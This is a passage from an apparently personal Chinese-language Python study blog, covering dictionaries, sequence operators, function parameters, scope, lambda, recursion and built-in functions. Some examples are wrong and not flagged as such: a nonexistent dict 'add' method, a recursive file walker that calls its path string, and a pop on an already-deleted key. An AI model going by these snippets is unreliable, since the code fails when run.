class="string">&#x27;male&#x27;</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(a))  <span class="comment"># 2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#获取元素 keys() values() items()</span></span><br><span class="line">a = &#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;yuer&#x27;</span>,<span class="string">&#x27;sex&#x27;</span>:<span class="string">&#x27;male&#x27;</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(a[<span class="string">&#x27;name&#x27;</span>]) <span class="comment">#只能通过键获取值，并且值可以修改</span></span><br><span class="line"><span class="built_in">print</span>(a.keys())  <span class="comment">#获取所有的键</span></span><br><span class="line"><span class="built_in">print</span>(a.values()) <span class="comment">#获取值</span></span><br><span class="line"><span class="built_in">print</span>(a.items())  <span class="comment">#获取所有的键值对，也可以通过for循环遍历</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#修改数据 update() add[]</span></span><br><span class="line">a = &#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;yuer&#x27;</span>,<span class="string">&#x27;sex&#x27;</span>:<span class="string">&#x27;male&#x27;</span>&#125;</span><br><span class="line">a.update(&#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;cookie&#x27;</span>&#125;) <span class="comment">#更新数据 </span></span><br><span class="line">a.update(&#123;<span class="string">&#x27;age&#x27;</span>:<span class="string">&#x27;18&#x27;</span>&#125;)  <span class="comment">#增加数据</span></span><br><span class="line">a.add[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&#x27;cookie&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line"><span class="comment">#删除数据 del pop</span></span><br><span class="line">a = &#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;yuer&#x27;</span>,<span class="string">&#x27;sex&#x27;</span>:<span class="string">&#x27;male&#x27;</span>&#125;</span><br><span class="line"><span class="keyword">del</span> a[<span class="string">&#x27;name&#x27;</span>]   <span class="comment">#删除指定键</span></span><br><span class="line">a.pop(<span class="string">&#x27;name&#x27;</span>)  <span class="comment">#删除指定键</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#排序操作 sorted()</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">sorted</span>(a.items(),key=<span class="keyword">lambda</span> d:d[<span class="number">0</span>])) <span class="comment">#按照key排序</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">sorted</span>(a.items(),key=<span class="keyword">lambda</span> d:d[<span class="number">1</span>])) <span class="comment">#按value排序，但是数据类型要一致</span></span><br><span class="line"><span class="comment"># 在函数sorted(a.items(), key = lambda d:d[1])中，第一个参数传给第二个参数“键-键值”，第二个参数取出其中的键([0])或键值(1])</span></span><br></pre></td></tr></table></figure>

<h5 id="0x05-公用方法"><a href="#0x05-公用方法" class="headerlink" title="0x05:公用方法"></a>0x05:公用方法</h5><h6 id="1-合并操作"><a href="#1-合并操作" class="headerlink" title="1.合并操作 +"></a>1.合并操作 +</h6><p><em>使用字符串、列表、元组</em></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="string">&#x27;yuer&#x27;</span></span><br><span class="line">b = <span class="string">&#x27;123&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(a+b)   <span class="comment">#yuer123</span></span><br><span class="line"></span><br><span class="line">listA = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line">listB = [<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>]</span><br><span class="line"><span class="built_in">print</span>(listA+listB)  <span class="comment">#[1, 2, 3, 7, 8, 9]</span></span><br><span class="line"></span><br><span class="line">tupleA = (<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>)</span><br><span class="line">tupleB = (<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>)</span><br><span class="line"><span class="built_in">print</span>(tupleA+tupleB)  <span class="comment">#(1, 2, 3, 4, 5, 6)</span></span><br></pre></td></tr></table></figure>

<h6 id="2-复制"><a href="#2-复制" class="headerlink" title="2.复制  *"></a>2.复制  *</h6><p><em>字符串、列表、元组</em></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="string">&#x27;yuer&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(a*<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">listA = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line"><span class="built_in">print</span>(listA*<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">tupleA = (<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>)</span><br><span class="line"><span class="built_in">print</span>(tupleA*<span class="number">3</span>)</span><br></pre></td></tr></table></figure>

<h6 id="3-in判断元素是否存在"><a href="#3-in判断元素是否存在" class="headerlink" title="3.in判断元素是否存在"></a>3.in判断元素是否存在</h6><p><em>字符串、列表、元组、字典</em></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="string">&#x27;yuer&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;a&#x27;</span> <span class="keyword">in</span> a)  <span class="comment">#bool值</span></span><br><span class="line"></span><br><span class="line">dic = &#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;yuer&#x27;</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;age&#x27;</span> <span class="keyword">in</span> dic) <span class="comment">#进行键查询</span></span><br></pre></td></tr></table></figure>

<h3 id="4-python函数基础"><a href="#4-python函数基础" class="headerlink" title="4.python函数基础"></a>4.python函数基础</h3><h5 id="0x01-函数基础"><a href="#0x01-函数基础" class="headerlink" title="0x01:函数基础"></a>0x01:函数基础</h5><p><u>函数定义：</u></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def 关键字 小括号 :</span><br><span class="line">	代码块</span><br><span class="line">	</span><br><span class="line">def 函数名(参数列表):</span><br><span class="line">	代码块</span><br></pre></td></tr></table></figure>

<p><u>函数说明文档：</u></p>
<p>函数内容的第一行可以用字符串进行函数说明</p>
<hr>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inform</span>():</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    用于输出信息</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;my name is &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="string">&#x27;yuer&#x27;</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;my age is &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="number">11</span>))</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出不同的信息，用参数实现</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inform</span>(<span class="params">name,age</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    自我介绍模板</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;my name is &#123;&#125;&quot;</span>.<span class="built_in">format</span>(name))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;my age is &#123;&#125;&quot;</span>.<span class="built_in">format</span>(age))</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>

<h5 id="0x02-函数参数"><a href="#0x02-函数参数" class="headerlink" title="0x02:函数参数"></a>0x02:函数参数</h5><p>参数分类：</p>
<p>必选参数、默认参数（缺省参数）、可选参数、关键字参数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">参数：函数为了实现某项特定功能，进而为了得到实现功能所需要的数据，为了得到外部数据</span><br><span class="line">必选参数：在函数调用的时候必须要赋值</span><br><span class="line">默认参数：</span><br><span class="line"></span><br><span class="line"># 定义函数学习参数</span><br></pre></td></tr></table></figure>

<h6 id="必选参数"><a href="#必选参数" class="headerlink" title="#必选参数"></a>#必选参数</h6><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sum</span>(<span class="params">a,b</span>):</span>  </span><br><span class="line">    <span class="comment">#a,b为形参，在定义的时候不占内存地址</span></span><br><span class="line">    <span class="built_in">sum</span> = a + b</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">sum</span>)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">a,b = <span class="built_in">map</span>(<span class="built_in">int</span>,<span class="built_in">input</span>().split())</span><br><span class="line"><span class="built_in">sum</span>(a,b) <span class="comment">#调用参数 这里的a,b是实参，占用内存地址</span></span><br><span class="line"><span class="built_in">sum</span>()  <span class="comment">#直接调用会报错，必须要有两个参数，因此是必选参数</span></span><br></pre></td></tr></table></figure>

<h6 id="默认参数"><a href="#默认参数" class="headerlink" title="#默认参数"></a>#默认参数</h6><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#始终存在于参数列表中的尾部</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sum</span>(<span class="params">a=<span class="number">20</span>,b=<span class="number">30</span></span>):</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;默认参数的使用=&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(a+b))</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="built_in">sum</span>()  <span class="comment">#可直接调用，若有参数的时候对个数不强制，但如果只有一个参数的时候默认赋值给前面的形参</span></span><br></pre></td></tr></table></figure>

<h6 id="可选参数（不定长参数"><a href="#可选参数（不定长参数" class="headerlink" title="#可选参数（不定长参数"></a>#可选参数（不定长参数</h6><p><em>接受的数据是一个元组类型</em></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#当参数的个数不确定时使用，比较灵活</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sum</span>(<span class="params">*args</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    可变长的参数类型</span></span><br><span class="line"><span class="string">    累加</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(args)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="built_in">sum</span>(<span class="number">1</span>)  </span><br><span class="line"><span class="built_in">sum</span>(<span class="number">1</span>,<span class="number">2</span>)  <span class="comment">#以元组形式进行输出</span></span><br><span class="line"><span class="comment">#for循环实现多参数遍历</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sum</span>(<span class="params">*args</span>):</span></span><br><span class="line">	<span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line">   	 	<span class="keyword">for</span> i <span class="keyword">in</span> args:</span><br><span class="line">        	<span class="built_in">sum</span> += i</span><br><span class="line">        	<span class="keyword">pass</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">sum</span>)</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>

<h6 id="关键字可变参数"><a href="#关键字可变参数" class="headerlink" title="#关键字可变参数"></a>#关键字可变参数</h6><p><em>接受的数据是字典类型</em></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#  ** 来定义</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#在函数体内 参数关键字是一个字典类型，key是一个字符串</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">keyFunc</span>(<span class="params">**kwargs</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(kwargs)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">keyFunct(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>) <span class="comment">#报错</span></span><br><span class="line">a = &#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;yuer&#x27;</span>,<span class="string">&#x27;age&#x27;</span>:<span class="string">&#x27;11&#x27;</span>&#125;</span><br><span class="line">keyFunc() <span class="comment">#空字典</span></span><br><span class="line">keyFunc(**a)  <span class="comment">#直接传字典的时候要加上 **</span></span><br><span class="line">keyFunc(name=<span class="string">&#x27;peter&#x27;</span>,age=<span class="number">18</span>) <span class="comment">#应该以键值对的形式传参</span></span><br></pre></td></tr></table></figure>

<h6 id="组合使用"><a href="#组合使用" class="headerlink" title="#组合使用"></a>#组合使用</h6><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">comx1</span>(<span class="params">*args,**kwargs</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(args)</span><br><span class="line">    <span class="built_in">print</span>(kwargs)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">comx1(age=<span class="number">18</span>)  </span><br><span class="line"></span><br><span class="line"><span class="comment">#可选参数必须放在关键字可选参数之前</span></span><br></pre></td></tr></table></figure>

<h5 id="0x03-函数返回值"><a href="#0x03-函数返回值" class="headerlink" title="0x03:函数返回值"></a>0x03:函数返回值</h5><p>*函数需要返回多个结果时，将要返回的值用逗号隔开，最终会返回一个包含所有返回值的元组</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.函数执行完以后会返回一个对象，如果函数的内部有return这个关键字，就可以返回实际的值，否则返回None</span><br><span class="line">2.可以返回任意类型，取决于return关键字后面的元素的类型</span><br><span class="line">3.给调用方返回数据</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sum</span>(<span class="params">a,b</span>):</span></span><br><span class="line">    <span class="built_in">sum</span> = a+b</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sum</span></span><br><span class="line">a,b = <span class="built_in">map</span>(<span class="built_in">int</span>,<span class="built_in">input</span>().split())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;a+b=&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">sum</span>(a,b)))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hanshu</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span></span><br><span class="line"><span class="built_in">print</span>(hanshu())  <span class="comment">#以元组类型输出</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hanshu</span>():</span></span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;yuer&#x27;</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(hanshu())  <span class="comment">#以字典类型输出</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(hanshu()))  <span class="comment">#字典</span></span><br></pre></td></tr></table></figure>

<h5 id="0x04-函数嵌套"><a href="#0x04-函数嵌套" class="headerlink" title="0x04:函数嵌套"></a>0x04:函数嵌套</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun1</span>():</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-----start------&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-----执行代码省略-----&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-----end-----&quot;</span>)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun2</span>():</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-----start-----&quot;</span>)</span><br><span class="line">    fun1()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-----end-----&quot;</span>)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#在调用fun2函数的时候会调用到fun1函数，fun1函数执行完毕之后继续执行之后的代码</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">函数分类：</span><br><span class="line">有参数无返回值</span><br><span class="line">有参数有返回值</span><br><span class="line">无参数无返回值</span><br><span class="line">无参数有返回值</span><br></pre></td></tr></table></figure>

<h3 id="5-函数进阶"><a href="#5-函数进阶" class="headerlink" title="5.函数进阶"></a>5.函数进阶</h3><h5 id="0x01-全局变量和局部变量"><a href="#0x01-全局变量和局部变量" class="headerlink" title="0x01:全局变量和局部变量"></a>0x01:全局变量和局部变量</h5><p><strong>局部变量：</strong></p>
<p>函数内部定义的变量（生效范围只在函数的内部，不同的函数可以定义相同的局部变量互不干扰，局部变量为了临时的保存数据，需要在函数中定义来进行存储</p>
<p><strong>全局变量：</strong></p>
<p>当全局变量和局部变量出现重复定义的时候，程序会优先执行使用函数内部定义的变量</p>
<p>如果在函数的内部想对全局变量进行修改的话，必须使用global关键字进行声明</p>
<p>修改全局变量：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">name = <span class="string">&#x27;yuer&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">changeGlobal</span>():</span></span><br><span class="line">	<span class="keyword">global</span> name</span><br><span class="line">	name = <span class="string">&#x27;cookie&#x27;</span></span><br><span class="line">	<span class="keyword">pass</span></span><br><span class="line">changeGlobal()</span><br><span class="line"><span class="built_in">print</span>(name)</span><br><span class="line">	</span><br></pre></td></tr></table></figure>

<h5 id="0x02-函数参数引用传值"><a href="#0x02-函数参数引用传值" class="headerlink" title="0x02:函数参数引用传值"></a>0x02:函数参数引用传值</h5><p><strong>不可变类型</strong></p>
<p>int str 元组</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;a的地址：&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">id</span>(a)))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;x的地址：&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">id</span>(x)))</span><br><span class="line">    x = <span class="number">2</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;x的地址：&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">id</span>(x)))</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">func(a)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;a的地址：&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">id</span>(a)))</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line"><span class="comment"># a的地址：140706376876304</span></span><br><span class="line"><span class="comment"># x的地址：140706376876304</span></span><br><span class="line"><span class="comment"># x的地址：140706376876336</span></span><br><span class="line"><span class="comment"># 1</span></span><br></pre></td></tr></table></figure>

<p><strong>可变类型</strong></p>
<p>字典 列表</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">listA = []</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span>(<span class="params">parms</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">id</span>(parms))</span><br><span class="line">    parms.append([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>])</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">id</span>(parms))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;内部的&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(parms))</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">id</span>(listA))</span><br><span class="line">func(listA)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;外部的&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(listA))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2715138216456</span></span><br><span class="line"><span class="comment"># 2715138216456</span></span><br><span class="line"><span class="comment"># 2715138216456</span></span><br><span class="line"><span class="comment"># 内部的[[1, 2, 3, 4]] </span></span><br><span class="line"><span class="comment"># 外部的[[1, 2, 3, 4]]  数据同步变化</span></span><br></pre></td></tr></table></figure>

<p><strong>小结</strong></p>
<p>1.在python中 万物皆对象，在函数调用的时候，实参传递的就是对象的引用</p>
<p>2.更好的把控 在函数内部的处理是否会影响函数外部数据的变化</p>
<p>3.参数传递是通过对象引用来完成</p>
<h5 id="0x03-匿名函数"><a href="#0x03-匿名函数" class="headerlink" title="0x03:匿名函数"></a>0x03:匿名函数</h5><p>利用<code>lambda</code>关键字创建匿名函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lambda 参数1,参数2,参数3:执行代码语句</span><br></pre></td></tr></table></figure>

<p>1.没有名字的函数</p>
<p>2.匿名函数冒号后面的表达式有且只有一个（是表达式，不是语句</p>
<p>3.匿名函数自带<code>return</code></p>
<p>4.用变量接收匿名函数，用变量进行调用</p>
<p>5.但是只能是单个表达式，不是一个代码块，只是为了满足简单函数的场景，仅仅能封装有限的逻辑，复杂逻辑实现不了</p>
<p>eg：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="keyword">lambda</span> x,y:x+y</span><br><span class="line"><span class="built_in">print</span>(a(<span class="number">1</span>,<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">######</span></span><br><span class="line"></span><br><span class="line">d = <span class="keyword">lambda</span> a,b,c:a*b*c</span><br><span class="line"><span class="built_in">print</span>(d(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">######</span></span><br></pre></td></tr></table></figure>

<p>双分支变但分支：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b if a else c</span><br><span class="line">#如果a成立则返回b 否则返回c</span><br></pre></td></tr></table></figure>

<p>结合：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#直接调用</span></span><br><span class="line">jg = (<span class="keyword">lambda</span> x,y:x <span class="keyword">if</span> x&gt;y <span class="keyword">else</span> y)(<span class="number">1</span>,<span class="number">4</span>)</span><br><span class="line"><span class="built_in">print</span>(jg)</span><br></pre></td></tr></table></figure>

<h5 id="0x04-递归函数"><a href="#0x04-递归函数" class="headerlink" title="0x04:递归函数"></a>0x04:递归函数</h5><p>如果一个函数在内部不调用其他函数，而是自己本身的话，这个函数就是递归函数</p>
<p>递归函数必须有一个结束条件，否则递归无法结束</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 求阶乘</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">if</span> x == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> x * func(x-<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="built_in">print</span>(func(<span class="number">5</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 模拟文件查找 实现树形结构的遍历</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os <span class="comment">#引入文件操作模块</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">findFile</span>(<span class="params">file_path</span>):</span></span><br><span class="line">    listRs = os.listdir(file_path) <span class="comment">#得到该路径下所有的文件夹</span></span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> listRs:</span><br><span class="line">        full_path = os.path.join(file_path, item)</span><br><span class="line">        <span class="comment">#获取完整的文件路径</span></span><br><span class="line">        <span class="keyword">if</span> os.path.isdir(full_path):</span><br><span class="line">        <span class="comment">#判断是否是文件夹</span></span><br><span class="line">        	file_path(full_path)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(item)</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> </span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">        </span><br></pre></td></tr></table></figure>

<p>1.自己调用自己</p>
<p>2.必须有一个明确的结束条件</p>
<p>3.优点：逻辑简单，定义简单</p>
<p>4.缺点：容易导致栈溢出。内存资源紧张，甚至内存泄漏</p>
<h3 id="6-内置函数"><a href="#6-内置函数" class="headerlink" title="6.内置函数"></a>6.内置函数</h3><h5 id="0x01-数学运算"><a href="#0x01-数学运算" class="headerlink" title="0x01:数学运算"></a>0x01:数学运算</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">abs()  求绝对值函数</span><br><span class="line">返回数字的绝对值</span><br><span class="line"></span><br><span class="line">round()</span><br><span class="line">求近似值</span><br><span class="line"></span><br><span class="line">pow()</span><br><span class="line">求次方</span><br><span class="line"></span><br><span class="line">divmod()</span><br><span class="line">求商和余数</span><br><span class="line"></span><br><span class="line">max()</span><br><span class="line">min()</span><br><span class="line">最值</span><br><span class="line"></span><br><span class="line">sum()</span><br><span class="line">和</span><br><span class="line"></span><br><span class="line">eval()</span><br><span class="line">将字符串当作代码</span><br></pre></td></tr></table></figure>

<h5 id="0x02-类型转换"><a href="#0x02-类型转换" class="headerlink" title="0x02:类型转换"></a>0x02:类型转换</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#数据类型的转换</span><br><span class="line">int()</span><br><span class="line">float()</span><br><span class="line">str()</span><br><span class="line"></span><br><span class="line">#ascii码相互转换</span><br><span class="line">ord()</span><br><span class="line">chr() </span><br><span class="line"></span><br><span class="line">bool()</span><br><span class="line"></span><br><span class="line">bin()</span><br><span class="line">hex()</span><br><span class="line">oct() 转成八进制</span><br><span class="line"></span><br><span class="line">list() 元组转换成列表</span><br><span class="line">tuple()</span><br><span class="line">dict() 创建字典</span><br><span class="line"></span><br><span class="line">bytes()</span><br></pre></td></tr></table></figure>

<p><code>dict()</code>字典操作（主要用于创建字典</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#语法</span></span><br><span class="line"><span class="comment"># class dict(**kwarg)</span></span><br><span class="line"><span class="comment"># class dict(mapping,**kwarg)</span></span><br><span class="line"><span class="comment"># class dict(iterable,**kwarg)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#参数</span></span><br><span class="line"><span class="comment"># **kwarg  关键字</span></span><br><span class="line"><span class="comment"># mapping 元素的容器</span></span><br><span class="line"><span class="comment"># iterable 可迭代对象</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#返回值</span></span><br><span class="line"><span class="comment">#返回一个字典</span></span><br><span class="line"></span><br><span class="line">dic = <span class="built_in">dict</span>(name=<span class="string">&#x27;cookie&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(dic))</span><br><span class="line">dic.update(&#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;yuer&#x27;</span>&#125;)  <span class="comment">#更新数据或者增加数据</span></span><br><span class="line">dic[<span class="string">&#x27;age&#x27;</span>] = <span class="number">18</span></span><br><span class="line"><span class="built_in">print</span>(dic)</span><br></pre></td></tr></table></figure>

<p><code>bytes()</code>转为字节数组</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#语法</span></span><br><span class="line"><span class="comment"># class bytearray([source[,encoding]]])</span></span><br><span class="line"><span class="comment">#参数</span></span><br><span class="line"><span class="comment"># source 为整数，则返回一个长度为source的初始化数组</span></span><br><span class="line"><span class="comment">#        为字符串，则按照指定的encoding将字符串转换成字节序列</span></span><br><span class="line"><span class="comment">#        为可迭代类型，则元素必须为[0,255]中的整数</span></span><br><span class="line"><span class="comment">#        为与buffer接口一致的对象，则次对象也可以被用于初始化bytes</span></span><br><span class="line"><span class="comment">#        如果没有输入任何参数，默认就是初始化数组为0个元素</span></span><br><span class="line"><span class="comment">#返回值</span></span><br><span class="line"><span class="comment">#返回新字节数组</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(<span class="string">&#x27;w我like python&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure>

<h5 id="0x03-序列操作"><a href="#0x03-序列操作" class="headerlink" title="0x03:序列操作"></a>0x03:序列操作</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">all()</span><br><span class="line">any()</span><br><span class="line">sorted()</span><br><span class="line">reverse()</span><br><span class="line">range()</span><br><span class="line">zip()</span><br><span class="line">enumerate()</span><br></pre></td></tr></table></figure>

<p><code>all()</code>与的关系</p>
